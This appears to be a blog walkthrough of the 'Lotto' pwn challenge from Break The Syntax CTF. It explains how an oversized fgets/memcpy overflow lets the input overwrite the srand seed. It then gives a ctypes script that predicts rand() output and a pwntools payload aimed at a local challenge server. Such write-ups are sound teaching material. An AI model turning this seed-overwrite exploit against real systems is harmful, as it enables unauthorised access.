---
title: Break_The_Syntax_CTF
published: 2025-08-21
description: A walkthrough for Lotto challenge from break_the_syntax_ctf.
tags: [Pwn, Writeups]
category: Pwn
draft: false
---


we are given a bin file , which is 
```
󰣇 bts_ctf/pwn/lotto ❯ file lotto.bin                                                                                                             
lotto.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b33dec53f8f1c8957618364105b1ede0b99ccd8f, for GNU/Linux 4.4.0, not stripped
```
```
󰣇 bts_ctf/pwn/lotto ❯ checksec --file=lotto.bin                                                                                                
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   40 Symbols	 No	0		3		lotto.bin
```

when we run the binary , it asks for 6 number as input , if all the 6 numbers are correct we get the flag, but each run there are random number generated with random seed, so need to somehow solve this.

The decompiled code , 
```
  fgets((char *)local_198,0x17b,stdin);
  __n = strlen((char *)local_198);
  memcpy(local_314,local_198,__n);
```
there is a fgets function, which takes long input than what we need , so this looks sus , when providing a long input , and looking at the GDB ,
```
*RIP  0x5555555553f1 (main+520) ◂— call srand@plt
───────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────
 ► 0x5555555553f1 <main+520>    call   srand@plt                   <srand@plt>
        seed: 0x61616364
 
   0x5555555553f6 <main+525>    lea    rax, [rbp - 0x330]
```
we can see that we can control the seed for random number.
it is at the offset of 307, so after this if we set it to know value we can find the number it generates , in my case i gonna set the value to 0xdeadbeef.

```
import ctypes


libc = ctypes.CDLL("libc.so.6")  
libc.srand(0xdeadbeef)  

for _ in range(6):  
    print(libc.rand() % 49 + 1)    

```
this is the python script to find the random numbers,


```
from pwn import *

p = remote('localhost',9000)

nums = b'11 9 42 12 16 3'
payload = nums + cyclic(307-len(nums)) + p64(0xdeadbeef) + cyclic(100)

p.sendline(payload)
p.interactive()
```
